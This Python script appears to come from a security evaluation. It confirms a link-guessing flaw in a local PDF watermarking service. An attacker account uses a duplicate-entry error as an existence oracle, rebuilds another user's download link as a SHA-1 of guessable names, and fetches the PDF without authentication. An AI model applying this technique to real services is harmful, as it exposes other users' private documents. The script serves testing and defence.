"""
Verifier re-check for FCS_COP.1 / FDP_UCT.1 against T.LINK_GUESS.

Independent of server/test/cc_test1.py:
  - Attacker is a DIFFERENT user (charlie) who never sees alice's create-watermark response.
  - Uses the "Duplicate entry" error of create-watermark as an existence oracle.
  - Final download is done with NO auth token at all.

Run ONLY against your own local deployment:
    python scripts/verifier_link_guess.py
"""

import hashlib
import time

import requests
from werkzeug.utils import secure_filename

BASE_URL = "http://localhost:5000"
RUN = str(int(time.time()))[-6:]  # makes reruns unique (DB link column is UNIQUE)

# Values the attacker GUESSES. In a real attack these are human-chosen,
# low-entropy strings (e.g. "report", a colleague's name).
DOC_NAME = f"report{RUN}"
RECIPIENT = "bob"

PDF = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
    b"3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj\n"
    b"xref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n"
    b"0000000058 00000 n\n0000000115 00000 n\n"
    b"trailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF"
)
WM_BODY = {"method": "HMAC-Signed", "key": "k", "secret": "s", "intended_for": RECIPIENT}


def make_user(login):
    email = f"{login}@verifier.test"
    pw = "VerifierPass123!"
    requests.post(f"{BASE_URL}/api/create-user",
                  json={"login": login, "email": email, "password": pw})
    r = requests.post(f"{BASE_URL}/api/login", json={"email": email, "password": pw})
    r.raise_for_status()
    return {"Authorization": f"Bearer {r.json()['token']}"}


def upload(headers, name):
    r = requests.post(f"{BASE_URL}/api/upload-document", headers=headers,
                      files={"file": ("report.pdf", PDF, "application/pdf")},
                      data={"name": name})
    r.raise_for_status()
    return r.json()["id"]


def show(step, r):
    print(f"[{step}] {r.request.method} {r.request.path_url} -> {r.status_code} "
          f"{r.headers.get('Content-Type')} | {r.text[:150]!r}")


print(f"Run id {RUN}: doc name = {DOC_NAME!r}, recipient = {RECIPIENT!r}\n")

# 1. Victim: alice uploads and watermarks a document for bob.
alice = make_user(f"alice{RUN}")
alice_doc = upload(alice, DOC_NAME)
r = requests.post(f"{BASE_URL}/api/create-watermark/{alice_doc}", headers=alice, json=WM_BODY)
show("1 alice create-watermark", r)
real_link = r.json()["link"]  # kept ONLY for the final comparison, never used by the attacker

# 2. Attacker: charlie is a separate account with no rights on alice's document.
charlie = make_user(f"charlie{RUN}")
show("2 charlie get-document(alice's id)",
     requests.get(f"{BASE_URL}/api/get-document/{alice_doc}", headers=charlie))

# 3. Oracle: charlie watermarks HIS OWN doc with the guessed name + recipient.
charlie_doc = upload(charlie, DOC_NAME)
show("3 charlie create-watermark (oracle)",
     requests.post(f"{BASE_URL}/api/create-watermark/{charlie_doc}", headers=charlie, json=WM_BODY))

# 4. Offline reconstruction from guessed values only.
guessed = hashlib.sha1(f"{DOC_NAME}__{secure_filename(RECIPIENT)}.pdf".encode()).hexdigest()
print(f"[4] guessed link = sha1('{DOC_NAME}__{RECIPIENT}.pdf') = {guessed}")

# 5. Negative control: a wrong guess should NOT work.
wrong = hashlib.sha1(f"{DOC_NAME}__mallory.pdf".encode()).hexdigest()
show("5 anonymous get-version(wrong guess)", requests.get(f"{BASE_URL}/api/get-version/{wrong}"))

# 6. Attack: download with NO Authorization header.
r = requests.get(f"{BASE_URL}/api/get-version/{guessed}")
show("6 anonymous get-version(guessed)", r)

print("\n=== RESULT ===")
print(f"guessed link == real link : {guessed == real_link}")
print(f"anonymous download        : HTTP {r.status_code}, {len(r.content)} bytes, "
      f"starts with %PDF: {r.content[:4] == b'%PDF'}")
if r.status_code == 200 and guessed == real_link:
    print("FCS_COP.1 / FDP_UCT.1 FAIL confirmed: an outsider rebuilt alice's link and downloaded the PDF.")
else:
    print("Attack did NOT succeed - claim not confirmed; check deployment version.")
